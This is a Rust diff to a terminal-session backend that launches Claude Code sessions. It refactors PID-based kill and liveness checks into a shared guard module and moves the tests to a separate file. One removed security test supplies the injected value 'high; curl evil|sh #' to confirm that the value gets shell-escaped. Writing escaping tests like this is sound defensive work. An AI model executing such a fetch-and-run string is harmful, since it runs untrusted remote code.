@@ -5,11 +5,12 @@
 
 mod detection;
 mod launch;
+mod pid_guard;
 mod pid_tracking;
 mod spawner;
 mod window_ops;
 
-use anyhow::{Context, Result};
+use anyhow::Result;
 use shell_escape::escape;
 use std::borrow::Cow;
 use std::path::{Path, PathBuf};
@@ -20,6 +21,7 @@ use crate::models::worktree::Worktree;
 
 pub use detection::detect_terminal;
 pub(crate) use launch::prepare_session_launch;
+pub(crate) use pid_guard::{pid_only_is_alive, pid_only_terminate, StalePidFiles};
 pub use pid_tracking::{
     cleanup_stage_files, create_wrapper_script, discover_claude_pid, pid_matches_entry,
     read_pid_entry, read_pid_file,
@@ -117,12 +119,35 @@ pub struct NativeBackend {
 }
 
 impl NativeBackend {
-    /// Create a new native backend, detecting the available terminal
+    /// Create a new native backend, detecting the available terminal.
+    ///
+    /// Terminal detection runs subprocess probes, so this is not free: callers
+    /// that may reach it repeatedly (see `SessionBackend::native_lane`) must
+    /// memoize the result rather than reconstructing per call.
     pub fn new(work_dir: PathBuf) -> Result<Self> {
         let terminal = detect_terminal()?;
-        // Log the detected terminal for debugging terminal selection issues
-        eprintln!("Detected terminal: {}", terminal.display_name());
+        // Detection is worth recording when diagnosing terminal selection, but
+        // it is not operator-facing news. `tracing::debug!` (the level the rest
+        // of this cluster uses — see `window_ops`) keeps it off stderr unless
+        // it was asked for; `eprintln!` here printed a line on every
+        // construction, which after a tmux fallback meant once per session per
+        // monitor tick.
+        tracing::debug!(terminal = %terminal.display_name(), "Detected terminal");
         Ok(Self { terminal, work_dir })
+    }
+
+    /// Build a backend around an already-chosen terminal, bypassing detection.
+    ///
+    /// Test-only: sibling modules need a deterministically AVAILABLE native
+    /// lane to exercise the tmux-fallback decision, and a headless test runner
+    /// (where [`Self::new`] bails in `detect_terminal`) would otherwise make
+    /// that path untestable exactly where it matters most.
+    #[cfg(test)]
+    pub(crate) fn with_terminal(
+        terminal: super::emulator::TerminalEmulator,
+        work_dir: PathBuf,
+    ) -> Self {
+        Self { terminal, work_dir }
     }
 
     /// Get the detected terminal emulator
@@ -277,19 +302,15 @@ impl NativeBackend {
     }
 
     pub fn kill_session(&self, session: &Session) -> Result<()> {
-        // Resolve the window title and PID-file key for this session,
-        // preferring the session's tracking_key so that merge/knowledge/
-        // base-conflict sessions (which use prefixed titles and keys) are
-        // killed correctly, not just bare stage sessions.
-        let resolved = Self::window_title_and_pid_key(session);
-
         // First, try to close the window by title (more reliable for all terminals).
         // This approach works correctly even for terminal emulators like gnome-terminal
         // that use a server process, where killing by PID would kill all windows.
-        if let Some((title, pid_key)) = &resolved {
-            if close_window_for_terminal(title, &self.terminal) {
+        // The title is the session's tracking_key, so merge/knowledge/base-conflict
+        // sessions (which use prefixed titles) are killed correctly too.
+        if let Some((title, pid_key)) = Self::window_title_and_pid_key(session) {
+            if close_window_for_terminal(&title, &self.terminal) {
                 // Clean up tracking files after closing the window
-                cleanup_stage_files(&self.work_dir, pid_key);
+                cleanup_stage_files(&self.work_dir, &pid_key);
                 return Ok(());
             }
         }
@@ -297,38 +318,9 @@ impl NativeBackend {
         // Fallback to PID-based killing for terminals where window title closing
         // didn't work (e.g., no wmctrl/xdotool installed, or window already closed).
         // This works correctly for terminals like kitty/alacritty where each window
-        // has its own process.
-        //
-        // Determine which PID to signal. Prefer the per-session PID file because
-        // it carries the recorded start-time: if the PID was recycled by an
-        // unrelated process, the entry no longer matches and we must NOT signal
-        // it (O-14 — never SIGTERM a stranger). Fall back to `session.pid` only
-        // when there is no PID-file evidence to the contrary.
-        let pid_to_kill = match resolved.as_ref() {
-            Some((_, pid_key)) => match read_pid_entry(&self.work_dir, pid_key) {
-                Some(entry) if pid_tracking::pid_matches_entry(&entry) => Some(entry.pid),
-                // PID file present but mismatched/dead → reused or gone; do not kill.
-                Some(_) => None,
-                // No PID file → fall back to the session's stored PID.
-                None => session.pid,
-            },
-            None => session.pid,
-        };
-
-        if let Some(pid) = pid_to_kill {
-            // Signal directly rather than shelling out to `kill(1)`: a syscall
-            // cannot block, whereas a fork+exec on the orchestrator's poll
-            // thread is one more way for teardown to stall scheduling.
-            // A process that is already gone is a success, not a failure.
-            crate::process::terminate(pid)
-                .with_context(|| format!("Failed to terminate session process {pid}"))?;
-        }
-
-        // Clean up tracking files regardless of whether a process was signaled.
-        if let Some((_, pid_key)) = &resolved {
-            cleanup_stage_files(&self.work_dir, pid_key);
-        }
-        Ok(())
+        // has its own process. The guarded PID layers (never signal a recycled
+        // PID, always clean up tracking files) are shared with every other lane.
+        pid_only_terminate(&self.work_dir, session)
     }
 
     pub fn is_session_alive(&self, session: &Session) -> Result<bool> {
@@ -337,36 +329,15 @@ impl NativeBackend {
         // 2. Check if that PID is alive
         // 3. Fallback to stored session.pid
         // 4. Fallback to window existence check
-
-        // Resolve the window title and PID-file key, preferring the
-        // session's tracking_key so prefixed sessions resolve correctly.
-        let resolved = Self::window_title_and_pid_key(session);
-
-        // First, try the per-session PID file. Verify BOTH liveness and the
-        // recorded process start-time so a recycled PID (an unrelated process
-        // that inherited the dead session's PID) is not reported as alive (O-14).
-        if let Some((_, pid_key)) = &resolved {
-            if let Some(entry) = read_pid_entry(&self.work_dir, pid_key) {
-                if pid_tracking::pid_matches_entry(&entry) {
-                    return Ok(true);
-                }
-                // PID file exists but the process is dead (or reused) - clean
-                // up and continue checking.
-                cleanup_stage_files(&self.work_dir, pid_key);
-            }
+        //
+        // Layers 1-3 are the lane-independent PID evidence; only layer 4 is
+        // native-specific, because only this lane has a window to look for.
+        if pid_only_is_alive(&self.work_dir, session, StalePidFiles::Reap) {
+            return Ok(true);
         }
 
-        // Fallback to the stored PID from the session, via the nix syscall
-        // helper instead of spawning a `kill -0` subprocess (P-7).
-        if let Some(pid) = session.pid {
-            if crate::process::is_process_alive(pid) {
-                return Ok(true);
-            }
-        }
-
-        // Final fallback: check if window still exists
-        if let Some((title, _)) = &resolved {
-            if window_exists_for_terminal(title, &self.terminal) {
+        if let Some((title, _)) = Self::window_title_and_pid_key(session) {
+            if window_exists_for_terminal(&title, &self.terminal) {
                 return Ok(true);
             }
         }
@@ -376,205 +347,4 @@ impl NativeBackend {
 }
 
 #[cfg(test)]
-mod tests {
-    use super::*;
-    use tempfile::TempDir;
-
-    #[test]
-    fn test_native_backend_creation() {
-        // May fail if no terminal is available; we only assert that when a
-        // terminal *is* available, construction succeeds.
-        let temp_dir = TempDir::new().unwrap();
-        let result = NativeBackend::new(temp_dir.path().to_path_buf());
-        if let Ok(backend) = result {
-            // Sanity: the constructed backend exposes its terminal emulator.
-            let _ = backend.terminal();
-        }
-    }
-
-    #[test]
-    fn window_title_and_pid_key_for_stage_session() {
-        let mut session = Session::new();
-        session.assign_to_stage("worker-pool".to_string());
-        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
-        // Title is the tracking_key, matched exactly against window titles.
-        assert_eq!(title, "loom-worker-pool");
-        // PID-file key is per-session: tracking_key + session.id (O-14).
-        assert_eq!(pid_key, format!("loom-worker-pool-{}", session.id));
-    }
-
-    #[test]
-    fn window_title_and_pid_key_for_merge_session() {
-        let mut session = Session::new_merge("loom/feature".to_string(), "main".to_string());
-        session.assign_to_stage("feature".to_string());
-        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
-        assert_eq!(title, "loom-merge-feature");
-        assert_eq!(pid_key, format!("loom-merge-feature-{}", session.id));
-    }
-
-    #[test]
-    fn window_title_and_pid_key_for_knowledge_session() {
-        let session = Session::new_knowledge("kb");
-        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
-        assert_eq!(title, "loom-knowledge-kb");
-        assert_eq!(pid_key, format!("loom-knowledge-kb-{}", session.id));
-    }
-
-    #[test]
-    fn window_title_and_pid_key_for_base_conflict_session() {
-        let mut session = Session::new_base_conflict("loom/_base/feature".to_string());
-        session.assign_to_stage("feature".to_string());
-        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
-        assert_eq!(title, "loom-base-conflict-feature");
-        assert_eq!(
-            pid_key,
-            format!("loom-base-conflict-feature-{}", session.id)
-        );
-    }
-
-    #[test]
-    fn window_title_and_pid_key_legacy_fallback() {
-        // Legacy session: empty tracking_key, falls back to the bare stage id.
-        let mut session = Session::new();
-        session.stage_id = Some("legacy".to_string());
-        session.tracking_key = String::new();
-        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
-        assert_eq!(title, "loom-legacy");
-        assert_eq!(pid_key, format!("loom-legacy-{}", session.id));
-    }
-
-    #[test]
-    fn window_title_and_pid_key_none_without_stage() {
-        // No tracking_key and no stage_id → nothing to resolve.
-        let session = Session::new();
-        assert!(NativeBackend::window_title_and_pid_key(&session).is_none());
-    }
-
-    #[test]
-    fn pid_key_distinct_per_session_for_same_stage() {
-        // O-14(a): two consecutive sessions for the SAME stage must get
-        // distinct PID-file keys, or liveness for the old session would read
-        // the new session's PID.
-        let mut s1 = Session::new();
-        s1.assign_to_stage("auth".to_string());
-        let mut s2 = Session::new();
-        s2.assign_to_stage("auth".to_string());
-
-        let (title1, key1) = NativeBackend::window_title_and_pid_key(&s1).unwrap();
-        let (title2, key2) = NativeBackend::window_title_and_pid_key(&s2).unwrap();
-        assert_eq!(title1, title2, "same stage → same window title");
-        assert_ne!(key1, key2, "different session → different PID-file key");
-    }
-
-    #[test]
-    fn prefix_sharing_stage_ids_get_distinct_titles() {
-        // O-5: `auth` and `auth-tests` must resolve to distinct window titles
-        // so kill/liveness for one never targets the other.
-        let mut auth = Session::new();
-        auth.assign_to_stage("auth".to_string());
-        let mut auth_tests = Session::new();
-        auth_tests.assign_to_stage("auth-tests".to_string());
-
-        let (auth_title, _) = NativeBackend::window_title_and_pid_key(&auth).unwrap();
-        let (auth_tests_title, _) = NativeBackend::window_title_and_pid_key(&auth_tests).unwrap();
-        assert_eq!(auth_title, "loom-auth");
-        assert_eq!(auth_tests_title, "loom-auth-tests");
-        assert_ne!(auth_title, auth_tests_title);
-        // The exact-match window ops (tested in window_ops.rs) ensure
-        // `loom-auth` never matches `loom-auth-tests`.
-    }
-
-    #[test]
-    fn build_claude_command_omits_remote_control_when_disabled() {
-        let cmd = build_claude_command(
-            "/usr/bin/claude",
-            "opus",
-            "xhigh",
-            "auto",
-            false,
-            "'prompt'",
-        );
-        assert_eq!(
-            cmd,
-            "/usr/bin/claude --model opus --effort xhigh --permission-mode auto 'prompt'"
-        );
-        assert!(!cmd.contains("--remote-control"));
-    }
-
-    #[test]
-    fn build_claude_command_appends_remote_control_when_enabled() {
-        let cmd = build_claude_command(
-            "/usr/bin/claude",
-            "sonnet",
-            "high",
-            "auto",
-            true,
-            "'prompt'",
-        );
-        // `sonnet`/`high`/`auto`/`/usr/bin/claude` contain only shell-safe
-        // chars, so escaping leaves them unquoted.
-        assert_eq!(
-            cmd,
-            "/usr/bin/claude --model sonnet --effort high --permission-mode auto 'prompt' --remote-control"
-        );
-        // The flag must sit AFTER the prompt positional, otherwise
-        // `--remote-control [name]` swallows the prompt as its optional arg.
-        let rc_idx = cmd.find("--remote-control").unwrap();
-        let prompt_idx = cmd.find("'prompt'").unwrap();
-        assert!(prompt_idx < rc_idx);
-    }
-
-    #[test]
-    fn build_claude_command_passes_permission_mode_before_prompt() {
-        // The resolved permission mode is passed on the CLI (not left to
-        // settings.local.json, which Claude Code ignores for `auto`). Like the
-        // other option flags it must precede the positional prompt.
-        let cmd = build_claude_command(
-            "/usr/bin/claude",
-            "opus",
-            "xhigh",
-            "acceptEdits",
-            false,
-            "'prompt'",
-        );
-        assert!(cmd.contains("--permission-mode acceptEdits"));
-        let mode_idx = cmd.find("--permission-mode").unwrap();
-        let prompt_idx = cmd.find("'prompt'").unwrap();
-        assert!(
-            mode_idx < prompt_idx,
-            "--permission-mode must precede the prompt positional"
-        );
-    }
-
-    #[test]
-    fn build_claude_command_escapes_effort_injection() {
-        // S-3: a tampered reasoning effort must be neutralized, not interpolated
-        // raw into the exec'd command line.
-        let cmd = build_claude_command(
-            "/usr/bin/claude",
-            "sonnet",
-            "high; curl evil|sh #",
-            "auto",
-            false,
-            "'prompt'",
-        );
-        // The whole effort token is single-quoted, so no `;`/`|`/`#` is active.
-        assert!(cmd.contains("--effort 'high; curl evil|sh #'"));
-        assert!(!cmd.contains("--effort high; curl"));
-    }
-
-    #[test]
-    fn build_claude_command_escapes_claude_path_with_spaces() {
-        // S-3: a claude path containing spaces must be quoted so the wrapper's
-        // `exec` doesn't split it into multiple words.
-        let cmd = build_claude_command(
-            "/opt/My Tools/claude",
-            "sonnet",
-            "high",
-            "auto",
-            false,
-            "'prompt'",
-        );
-        assert!(cmd.starts_with("'/opt/My Tools/claude' --model sonnet"));
-    }
-}
+mod tests;
